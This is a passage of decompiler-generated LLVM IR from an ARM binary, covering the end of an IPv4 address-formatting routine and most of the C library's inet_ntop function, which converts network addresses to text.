  %v3_15b68 = add i32 %v2_15b60, %v0_15b5c
  %v4_15b68 = inttoptr i32 %v3_15b68 to i8*
  store i8 %v1_15b68, i8* %v4_15b68, align 1
  %v0_15b6c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b6c = load i32, i32* %r0.global-to-local, align 4
  %v2_15b6c = add i32 %v1_15b6c, %v0_15b6c
  %v3_15b74 = add i32 %v2_15b6c, -17
  %v4_15b74 = inttoptr i32 %v3_15b74 to i8*
  store i8 46, i8* %v4_15b74, align 1
  %v0_15b78 = load i32, i32* %r0.global-to-local, align 4
  %v1_15b78 = add i32 %v0_15b78, 1
  store i32 %v1_15b78, i32* %r6.global-to-local, align 4
  %v0_15b7c = load i32, i32* %sl.global-to-local, align 4
  %v1_15b7c = add i32 %v0_15b7c, 1
  store i32 %v1_15b7c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %entry, %dec_label_pc_15b4c
  %v0_15b8c = phi i32 [ 0, %entry ], [ %v1_15b78, %dec_label_pc_15b4c ]
  %v1_15ad0 = phi i32 [ 0, %entry ], [ %v1_15b7c, %dec_label_pc_15b4c ]
  store i32 %v2_15b80, i32* %ip.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_15b8c, i32* %r7.global-to-local, align 4
  %v2_15b90 = add i32 %v0_15b8c, %v2_15b80
  store i32 %v2_15b90, i32* %r5.global-to-local, align 4
  %v7_15b94 = icmp sgt i32 %v1_15ad0, 3
  br i1 %v7_15b94, label %dec_label_pc_15b98, label %dec_label_pc_15ad0

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b80
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_15b9c = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_15b9c, i32* %r4.global-to-local, align 4
  %v3_15ba0 = add i32 %v2_15b90, -18
  %v4_15ba0 = inttoptr i32 %v3_15ba0 to i8*
  store i8 0, i8* %v4_15ba0, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_15b9c, i32* %r0.global-to-local, align 4
  %v3_15ba8 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_15ba8, i32* %r0.global-to-local, align 4
  %v2_15bac = load i32, i32* %stack_var_-72, align 4
  %tmp = icmp ugt i32 %v3_15ba8, %v2_15bac
  br i1 %tmp, label %dec_label_pc_15bb8, label %dec_label_pc_15bd4

dec_label_pc_15bb8:                               ; preds = %dec_label_pc_15b98
  %v0_15bbc = call i32 @__aeabi_read_tp()
  store i32 %v0_15bbc, i32* %r0.global-to-local, align 4
  %v3_15bc0 = load i16, i16* @global_var_24070.401, align 2
  %v4_15bc0 = sext i16 %v3_15bc0 to i32
  %v0_15bc8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15bc8, i32* %r1.global-to-local, align 4
  %v3_15bcc = add i32 %v4_15bc0, %v0_15bbc
  %v4_15bcc = inttoptr i32 %v3_15bcc to i32*
  store i32 28, i32* %v4_15bcc, align 4
  %v0_15be4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15be4

dec_label_pc_15bd4:                               ; preds = %dec_label_pc_15b98
  store i32 %v2_15b9c, i32* @r1, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_15bdc = inttoptr i32 %arg2 to i8*
  %v3_15bdc = call i32 @strcpy(i8* %v2_15bdc, i32 %v2_15b9c)
  store i32 %v3_15bdc, i32* %r0.global-to-local, align 4
  store i32 %v3_15bdc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15be4

dec_label_pc_15be4:                               ; preds = %dec_label_pc_15bb8, %dec_label_pc_15bd4
  %v0_15be4 = phi i32 [ %v0_15be4.pre, %dec_label_pc_15bb8 ], [ %v3_15bdc, %dec_label_pc_15bd4 ]
  store i32 %v0_15be4, i32* %r0.global-to-local, align 4
  ret i32 %v0_15be4

; uselistorder directives
  uselistorder i32 %v0_15be4, { 1, 0 }
  uselistorder i32 %v2_15b9c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15b90, { 0, 2, 1 }
  uselistorder i32 %v1_15ad0, { 1, 0 }
  uselistorder i32 %v1_15b64, { 1, 0 }
  uselistorder i32 %v1_15b18, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15b80, { 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 4, 5, 0, 1, 2, 3 }
  uselistorder i8 48, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15be4, { 1, 0 }
  uselistorder label %dec_label_pc_15b80, { 1, 0 }
  uselistorder label %dec_label_pc_15b4c, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_15bf8 = load i32, i32* @r5, align 4
  %v7_15c04 = icmp eq i32 %arg1, 2
  store i1 %v7_15c04, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_15c04, label %dec_label_pc_15c28, label %dec_label_pc_15c1c

dec_label_pc_15c1c:                               ; preds = %entry
  %v7_15c1c = icmp eq i32 %arg1, 10
  store i1 %v7_15c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15c1c, label %dec_label_pc_15c3c, label %dec_label_pc_15e58

dec_label_pc_15c28:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_15c34 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_15e50

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c1c
  %v2_15c3c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15c3c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15c48 = bitcast i32* %stack_var_-72 to i8*
  %v4_15c48 = call i32 @__GI_memset(i8* %v3_15c48, i32 0, i32 32)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_15c6c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15c50

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c50.dec_label_pc_15c50_crit_edge, %dec_label_pc_15c3c
  %v0_15c68 = phi i32 [ %v0_15c50.pre, %dec_label_pc_15c50.dec_label_pc_15c50_crit_edge ], [ 0, %dec_label_pc_15c3c ]
  %v1_15c50 = load i32, i32* @r8, align 4
  %v2_15c50 = add i32 %v1_15c50, %v0_15c68
  %v3_15c54 = inttoptr i32 %v2_15c50 to i8*
  %v4_15c54 = load i8, i8* %v3_15c54, align 1
  %v6_15c54 = zext i8 %v4_15c54 to i32
  store i32 %v6_15c54, i32* %r1.global-to-local, align 4
  %v1_15c58 = add i32 %v2_15c50, 1
  %v2_15c58 = inttoptr i32 %v1_15c58 to i8*
  %v3_15c58 = load i8, i8* %v2_15c58, align 1
  %v4_15c58 = zext i8 %v3_15c58 to i32
  %tmp73 = icmp slt i32 %v0_15c68, 0
  %v4_15c5c = zext i1 %tmp73 to i32
  %v5_15c5c = add i32 %v4_15c5c, %v0_15c68
  %v4_15c60 = mul nuw nsw i32 %v6_15c54, 256
  %v5_15c60 = or i32 %v4_15c58, %v4_15c60
  %v3_15c64 = sdiv i32 %v5_15c5c, 2
  %v1_15c68 = add i32 %v0_15c68, 2
  store i32 %v1_15c68, i32* %r0.global-to-local, align 4
  store i32 %v2_15c6c, i32* %r1.global-to-local, align 4
  %v4_15c70 = mul i32 %v3_15c64, 4
  %v5_15c70 = add i32 %v4_15c70, %v2_15c6c
  %v7_15c74 = icmp eq i32 %v1_15c68, 15
  store i1 %v7_15c74, i1* %cpsr_z.global-to-local, align 1
  %v2_15c78 = add i32 %v5_15c70, -32
  %v3_15c78 = inttoptr i32 %v2_15c78 to i32*
  store i32 %v5_15c60, i32* %v3_15c78, align 4
  %v7_15c7c = icmp sgt i32 %v1_15c68, 15
  br i1 %v7_15c7c, label %dec_label_pc_15c80, label %dec_label_pc_15c50.dec_label_pc_15c50_crit_edge

dec_label_pc_15c50.dec_label_pc_15c50_crit_edge:  ; preds = %dec_label_pc_15c50
  %v0_15c50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15c50

dec_label_pc_15c80:                               ; preds = %dec_label_pc_15c50
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15c98

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c80, %dec_label_pc_15ce4
  %v0_15cd8 = phi i32 [ -1, %dec_label_pc_15c80 ], [ %v0_15d0c, %dec_label_pc_15ce4 ]
  %v0_15cc8 = phi i32 [ -1, %dec_label_pc_15c80 ], [ %v0_15cf8, %dec_label_pc_15ce4 ]
  %v0_15cac = phi i32 [ -1, %dec_label_pc_15c80 ], [ %v0_15cac7, %dec_label_pc_15ce4 ]
  %v0_15ce4 = phi i32 [ 0, %dec_label_pc_15c80 ], [ %v1_15ce4, %dec_label_pc_15ce4 ]
  %v4_15c9c = mul nuw nsw i32 %v0_15ce4, 4
  %v5_15c9c = add i32 %v4_15c9c, %v2_15c6c
  %v1_15ca0 = add i32 %v5_15c9c, -32
  %v2_15ca0 = inttoptr i32 %v1_15ca0 to i32*
  %v3_15ca0 = load i32, i32* %v2_15ca0, align 4
  %v2_15ca4 = icmp eq i32 %v3_15ca0, 0
  %v7_15cac = icmp eq i32 %v0_15cac, -1
  br i1 %v2_15ca4, label %dec_label_pc_15cac, label %dec_label_pc_15cc0

dec_label_pc_15cac:                               ; preds = %dec_label_pc_15c98
  br i1 %v7_15cac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15cac
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_15ce4

.thread:                                          ; preds = %dec_label_pc_15cac
  %v1_15cb8.pre = load i32, i32* @r4, align 4
  %v2_15cb8 = add i32 %v1_15cb8.pre, 1
  store i32 %v2_15cb8, i32* @r4, align 4
  br label %dec_label_pc_15ce4

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15c98
  br i1 %v7_15cac, label %dec_label_pc_15ce4, label %dec_label_pc_15cc8

dec_label_pc_15cc8:                               ; preds = %dec_label_pc_15cc0
  %v7_15cc8 = icmp eq i32 %v0_15cc8, -1
  %v0_15cdc.pre = load i32, i32* @r4, align 4
  %v1_15cd0 = load i32, i32* @r7, align 4
  %v7_15cd4 = icmp sgt i32 %v0_15cdc.pre, %v1_15cd0
  %or.cond = or i1 %v7_15cc8, %v7_15cd4
  br i1 %or.cond, label %dec_label_pc_15cd8, label %dec_label_pc_15ce0

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cc8
  store i32 %v0_15cd8, i32* @r6, align 4
  store i32 %v0_15cdc.pre, i32* @r7, align 4
  br label %dec_label_pc_15ce0

dec_label_pc_15ce0:                               ; preds = %dec_label_pc_15cc8, %dec_label_pc_15cd8
  %v0_15cc812 = phi i32 [ %v0_15cd8, %dec_label_pc_15cd8 ], [ %v0_15cc8, %dec_label_pc_15cc8 ]
  br label %dec_label_pc_15ce4

dec_label_pc_15ce4:                               ; preds = %bb, %.thread, %dec_label_pc_15cc0, %dec_label_pc_15ce0
  %v0_15d0c = phi i32 [ %v0_15cd8, %.thread ], [ %v0_15ce4, %bb ], [ %v0_15cd8, %dec_label_pc_15cc0 ], [ -1, %dec_label_pc_15ce0 ]
  %v0_15cac7 = phi i32 [ %v0_15cac, %.thread ], [ %v0_15ce4, %bb ], [ -1, %dec_label_pc_15cc0 ], [ -1, %dec_label_pc_15ce0 ]
  %v0_15cf8 = phi i32 [ %v0_15cc8, %.thread ], [ %v0_15cc8, %bb ], [ %v0_15cc8, %dec_label_pc_15cc0 ], [ %v0_15cc812, %dec_label_pc_15ce0 ]
  %v1_15ce4 = add nuw nsw i32 %v0_15ce4, 1
  store i32 %v1_15ce4, i32* %r1.global-to-local, align 4
  %v7_15cec = icmp slt i32 %v1_15ce4, 8
  br i1 %v7_15cec, label %dec_label_pc_15c98, label %dec_label_pc_15cf0

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15ce4
  %v7_15cf0 = icmp eq i32 %v0_15d0c, -1
  store i1 %v7_15cf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15cf0, label %dec_label_pc_15cf0.dec_label_pc_15d10_crit_edge, label %dec_label_pc_15cf8

dec_label_pc_15cf0.dec_label_pc_15d10_crit_edge:  ; preds = %dec_label_pc_15cf0
  %v1_15d34.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15d10

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15cf0
  %v7_15cf8 = icmp eq i32 %v0_15cf8, -1
  store i1 %v7_15cf8, i1* %cpsr_z.global-to-local, align 1
  %v0_15d08.pre = load i32, i32* @r4, align 4
  br i1 %v7_15cf8, label %dec_label_pc_15d08, label %dec_label_pc_15d00

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15cf8
  %v1_15d00 = load i32, i32* @r7, align 4
  %v9_15d00 = icmp eq i32 %v0_15d08.pre, %v1_15d00
  store i1 %v9_15d00, i1* %cpsr_z.global-to-local, align 1
  %v7_15d04 = icmp sgt i32 %v0_15d08.pre, %v1_15d00
  br i1 %v7_15d04, label %dec_label_pc_15d08, label %dec_label_pc_15d10

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15cf8, %dec_label_pc_15d00
  store i32 %v0_15d08.pre, i32* @r7, align 4
  store i32 %v0_15d0c, i32* @r6, align 4
  br label %dec_label_pc_15d10

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15cf0.dec_label_pc_15d10_crit_edge, %dec_label_pc_15d00, %dec_label_pc_15d08
  %v1_15d34.pre = phi i32 [ %v1_15d00, %dec_label_pc_15d00 ], [ %v1_15d34.pre.pre, %dec_label_pc_15cf0.dec_label_pc_15d10_crit_edge ], [ %v0_15d08.pre, %dec_label_pc_15d08 ]
  %v0_15d10 = phi i32 [ %v0_15cf8, %dec_label_pc_15d00 ], [ %v0_15cf8, %dec_label_pc_15cf0.dec_label_pc_15d10_crit_edge ], [ %v0_15d0c, %dec_label_pc_15d08 ]
  %v7_15d10 = icmp eq i32 %v0_15d10, -1
  store i1 %v7_15d10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d10, label %dec_label_pc_15d10._crit_edge, label %dec_label_pc_15d18

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15d10
  %v7_15d18 = icmp eq i32 %v1_15d34.pre, 1
  store i1 %v7_15d18, i1* %cpsr_z.global-to-local, align 1
  %v7_15d1c = icmp slt i32 %v1_15d34.pre, 2
  br i1 %v7_15d1c, label %bb54, label %dec_label_pc_15d10._crit_edge

bb54:                                             ; preds = %dec_label_pc_15d18
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_15d10._crit_edge

dec_label_pc_15d10._crit_edge:                    ; preds = %dec_label_pc_15d10, %dec_label_pc_15d18, %bb54
  %v0_15d34 = phi i32 [ %v0_15d10, %dec_label_pc_15d18 ], [ -1, %bb54 ], [ %v0_15d10, %dec_label_pc_15d10 ]
  %v2_15d24 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_15d24, i32* @r4, align 4
  %v0_15d28 = load i32, i32* @r5, align 4
  %v2_15d28 = add i32 %v0_15d28, -34016
  store i32 %v2_15d28, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_15d34 = add i32 %v0_15d34, %v1_15d34.pre
  store i32 %v2_15d34, i32* @sl, align 4
  %v9_15d94 = icmp eq i32 %tmp, ptrtoint (i32* @global_var_ffff.655 to i32)
  %v7_15d3c67 = icmp eq i32 %v0_15d34, -1
  store i1 %v7_15d3c67, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d10._crit_edge, %dec_label_pc_15dec
  %v7_15d3c71 = phi i1 [ %v7_15d3c67, %dec_label_pc_15d10._crit_edge ], [ %v7_15d3c, %dec_label_pc_15dec ]
  %v0_15d6870 = phi i32 [ 0, %dec_label_pc_15d10._crit_edge ], [ %v1_15dec, %dec_label_pc_15dec ]
  %v1_15d5469 = phi i32 [ %v0_15d34, %dec_label_pc_15d10._crit_edge ], [ %v0_15d3c.pre, %dec_label_pc_15dec ]
  %v2_15d6c68 = phi i32 [ %v2_15d24, %dec_label_pc_15d10._crit_edge ], [ %v3_15d5829, %dec_label_pc_15dec ]
  br i1 %v7_15d3c71, label %dec_label_pc_15d60, label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d3c
  %v9_15d44 = icmp eq i32 %v0_15d6870, %v1_15d5469
  store i1 %v9_15d44, i1* %cpsr_z.global-to-local, align 1
  %v5_15d48 = icmp slt i32 %v0_15d6870, %v1_15d5469
  br i1 %v5_15d48, label %dec_label_pc_15d60, label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d44
  %v1_15d4c = load i32, i32* @sl, align 4
  %v9_15d4c = icmp eq i32 %v0_15d6870, %v1_15d4c
  store i1 %v9_15d4c, i1* %cpsr_z.global-to-local, align 1
  %v6_15d50 = icmp slt i32 %v0_15d6870, %v1_15d4c
  br i1 %v6_15d50, label %dec_label_pc_15d54, label %dec_label_pc_15d60

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d4c
  store i1 %v9_15d44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d44, label %bb55, label %dec_label_pc_15dec

bb55:                                             ; preds = %dec_label_pc_15d54
  %v1_15d58 = load i32, i32* @sb, align 4
  %v2_15d58 = trunc i32 %v1_15d58 to i8
  %v4_15d58 = inttoptr i32 %v2_15d6c68 to i8*
  store i8 %v2_15d58, i8* %v4_15d58, align 1
  %v5_15d58 = load i32, i32* @r4, align 4
  %v6_15d58 = add i32 %v5_15d58, 1
  store i32 %v6_15d58, i32* @r4, align 4
  br label %dec_label_pc_15dec

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d4c, %dec_label_pc_15d44, %dec_label_pc_15d3c
  %v2_15d60 = icmp eq i32 %v0_15d6870, 0
  store i1 %v2_15d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d60, label %dec_label_pc_15dd0, label %dec_label_pc_15d68

dec_label_pc_15d68:                               ; preds = %dec_label_pc_15d60
  %v7_15d68 = icmp eq i32 %v0_15d6870, 6
  store i1 %v7_15d68, i1* %cpsr_z.global-to-local, align 1
  %v0_15d6c = load i32, i32* @sb, align 4
  %v1_15d6c = trunc i32 %v0_15d6c to i8
  %v3_15d6c = inttoptr i32 %v2_15d6c68 to i8*
  store i8 %v1_15d6c, i8* %v3_15d6c, align 1
  %v4_15d6c = load i32, i32* @r4, align 4
  %v5_15d6c = add i32 %v4_15d6c, 1
  store i32 %v5_15d6c, i32* @r4, align 4
  %v0_15d70 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15d70, label %dec_label_pc_15d74, label %dec_label_pc_15dd0

dec_label_pc_15d74:                               ; preds = %dec_label_pc_15d68
  %v0_15d74 = load i32, i32* @r6, align 4
  %v2_15d74 = icmp eq i32 %v0_15d74, 0
  store i1 %v2_15d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d74, label %dec_label_pc_15d7c, label %dec_label_pc_15dd0

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d74
  %v0_15d7c = load i32, i32* @r7, align 4
  %v7_15d7c = icmp eq i32 %v0_15d7c, 6
  store i1 %v7_15d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d7c, label %dec_label_pc_15d9c, label %dec_label_pc_15d84

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d7c
  %v7_15d84 = icmp eq i32 %v0_15d7c, 5
  store i1 %v7_15d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d84, label %dec_label_pc_15d8c, label %dec_label_pc_15dd0

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d84
  store i32 ptrtoint (i32* @global_var_ffff.655 to i32), i32* %r1.global-to-local, align 4
  store i1 %v9_15d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d94, label %dec_label_pc_15d9c, label %dec_label_pc_15dd0

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d8c, %dec_label_pc_15d7c
  %v2_15da0 = sub i32 %v2_15c6c, %v5_15d6c
  store i32 %v5_15d6c, i32* %r1.global-to-local, align 4
  %v0_15da8 = load i32, i32* @r8, align 4
  %v1_15da8 = add i32 %v0_15da8, 12
  store i32 %v1_15da8, i32* %r0.global-to-local, align 4
  %v1_15dac = add i32 %v2_15da0, -32
  %v3_15db0 = call i32 @inet_ntop4(i32 %v1_15da8, i32 %v5_15d6c, i32 %v1_15dac)
  store i32 %v3_15db0, i32* %r0.global-to-local, align 4
  %v2_15db4 = icmp eq i32 %v3_15db0, 0
  store i1 %v2_15db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15db4, label %bb56, label %dec_label_pc_15dc0

bb56:                                             ; preds = %dec_label_pc_15d9c
  %v1_15db8 = load i32, i32* @r6, align 4
  store i32 %v1_15db8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15d9c
  %v0_15dc0 = load i32, i32* @r4, align 4
  %v1_15dc0 = inttoptr i32 %v0_15dc0 to i8*
  store i32 %v0_15dc0, i32* %r0.global-to-local, align 4
  %v3_15dc4 = call i32 @strlen(i8* %v1_15dc0)
  store i32 %v3_15dc4, i32* %r0.global-to-local, align 4
  %v0_15dc8 = load i32, i32* @r4, align 4
  %v2_15dc8 = add i32 %v0_15dc8, %v3_15dc4
  store i32 %v2_15dc8, i32* @r4, align 4
  %v0_15e00.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15e00

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15d8c, %dec_label_pc_15d84, %dec_label_pc_15d74, %dec_label_pc_15d68, %dec_label_pc_15d60
  %v0_15dd8 = phi i32 [ %v5_15d6c, %dec_label_pc_15d8c ], [ %v5_15d6c, %dec_label_pc_15d84 ], [ %v5_15d6c, %dec_label_pc_15d74 ], [ %v5_15d6c, %dec_label_pc_15d68 ], [ %v2_15d6c68, %dec_label_pc_15d60 ]
  store i32 %v2_15c6c, i32* @lr, align 4
  %v1_15dd4 = load i32, i32* @r5, align 4
  %v4_15dd4 = mul i32 %v1_15dd4, 4
  %v5_15dd4 = add i32 %v4_15dd4, %v2_15c6c
  store i32 %v0_15dd8, i32* @r0, align 4
  %v1_15ddc = add i32 %v5_15dd4, -32
  %v2_15ddc = inttoptr i32 %v1_15ddc to i32*
  %v3_15ddc = load i32, i32* %v2_15ddc, align 4
  %v0_15de0 = load i32, i32* @fp, align 4
  store i32 %v0_15de0, i32* %r1.global-to-local, align 4
  %v4_15de4 = call i32 @sprintf(i32 %v0_15dd8, i32 %v0_15de0, i32 %v3_15ddc, i32 %v5_15dd4)
  store i32 %v4_15de4, i32* %r0.global-to-local, align 4
  %v0_15de8 = load i32, i32* @r4, align 4
  %v2_15de8 = add i32 %v0_15de8, %v4_15de4
  store i32 %v2_15de8, i32* @r4, align 4
  br label %dec_label_pc_15dec

dec_label_pc_15dec:                               ; preds = %bb55, %dec_label_pc_15d54, %dec_label_pc_15dd0
  %v3_15d5829 = phi i32 [ %v6_15d58, %bb55 ], [ %v2_15d6c68, %dec_label_pc_15d54 ], [ %v2_15de8, %dec_label_pc_15dd0 ]
  %v0_15dec = load i32, i32* @r5, align 4
  %v1_15dec = add i32 %v0_15dec, 1
  store i32 %v1_15dec, i32* @r5, align 4
  %v0_15d3c.pre = load i32, i32* @r6, align 4
  %v7_15df4 = icmp slt i32 %v1_15dec, 8
  %v7_15d3c = icmp eq i32 %v0_15d3c.pre, -1
  store i1 %v7_15d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15df4, label %dec_label_pc_15d3c, label %dec_label_pc_15df8

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15dec
  br i1 %v7_15d3c, label %.thread2, label %dec_label_pc_15e00

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15df8, %dec_label_pc_15dc0
  %v3_15e0c = phi i32 [ %v3_15d5829, %dec_label_pc_15df8 ], [ %v2_15dc8, %dec_label_pc_15dc0 ]
  %v0_15e00 = phi i32 [ %v0_15d3c.pre, %dec_label_pc_15df8 ], [ %v0_15e00.pre, %dec_label_pc_15dc0 ]
  %v1_15e00 = load i32, i32* @r7, align 4
  %v2_15e00 = add i32 %v1_15e00, %v0_15e00
  %v7_15e04 = icmp eq i32 %v2_15e00, 8
  store i1 %v7_15e04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15e04, label %bb57, label %.thread2

bb57:                                             ; preds = %dec_label_pc_15e00
  %v4_15e0c = inttoptr i32 %v3_15e0c to i8*
  store i8 58, i8* %v4_15e0c, align 1
  %v5_15e0c = load i32, i32* @r4, align 4
  %v6_15e0c = add i32 %v5_15e0c, 1
  store i32 %v6_15e0c, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15e00, %dec_label_pc_15df8, %bb57
  %v2_15e14 = phi i32 [ %v3_15e0c, %dec_label_pc_15e00 ], [ %v3_15d5829, %dec_label_pc_15df8 ], [ %v6_15e0c, %bb57 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_15e14 = inttoptr i32 %v2_15e14 to i8*
  store i8 0, i8* %v3_15e14, align 1
  %v4_15e14 = load i32, i32* @r4, align 4
  %v5_15e14 = add i32 %v4_15e14, 1
  store i32 %v2_15d24, i32* @r1, align 4
  %v2_15e1c = load i32, i32* %stack_var_-128, align 4
  %v2_15e20 = sub i32 %v5_15e14, %v2_15d24
  %v9_15e24 = icmp eq i32 %v2_15e20, %v2_15e1c
  store i1 %v9_15e24, i1* %cpsr_z.global-to-local, align 1
  %tmp74 = icmp ugt i32 %v2_15e20, %v2_15e1c
  br i1 %tmp74, label %dec_label_pc_15e2c, label %dec_label_pc_15e48

dec_label_pc_15e2c:                               ; preds = %.thread2
  %v0_15e30 = call i32 @__aeabi_read_tp()
  store i32 %v0_15e30, i32* %r0.global-to-local, align 4
  %v3_15e34 = load i16, i16* @global_var_24070.401, align 2
  %v4_15e34 = sext i16 %v3_15e34 to i32
  %v0_15e3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15e3c, i32* %r1.global-to-local, align 4
  %v3_15e40 = add i32 %v4_15e34, %v0_15e30
  %v4_15e40 = inttoptr i32 %v3_15e40 to i32*
  store i32 28, i32* %v4_15e40, align 4
  %v0_15e70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e48:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_15e4c = inttoptr i32 %arg3 to i8*
  %v3_15e4c = call i32 @strcpy(i8* %v2_15e4c, i32 %v2_15d24)
  br label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15c28, %dec_label_pc_15e48
  %storemerge = phi i32 [ %v3_15c34, %dec_label_pc_15c28 ], [ %v3_15e4c, %dec_label_pc_15e48 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15c1c
  %v0_15e5c = call i32 @__aeabi_read_tp()
  store i32 %v0_15e5c, i32* %r0.global-to-local, align 4
  %v3_15e60 = load i16, i16* @global_var_24070.401, align 2
  %v4_15e60 = sext i16 %v3_15e60 to i32
  %v3_15e68 = add i32 %v4_15e60, %v0_15e5c
  %v4_15e68 = inttoptr i32 %v3_15e68 to i32*
  store i32 97, i32* %v4_15e68, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e70:                               ; preds = %bb56, %dec_label_pc_15e50, %dec_label_pc_15e2c, %dec_label_pc_15e58
  %v0_15e70 = phi i32 [ %v1_15db8, %bb56 ], [ %storemerge, %dec_label_pc_15e50 ], [ %v0_15e70.pre, %dec_label_pc_15e2c ], [ 0, %dec_label_pc_15e58 ]
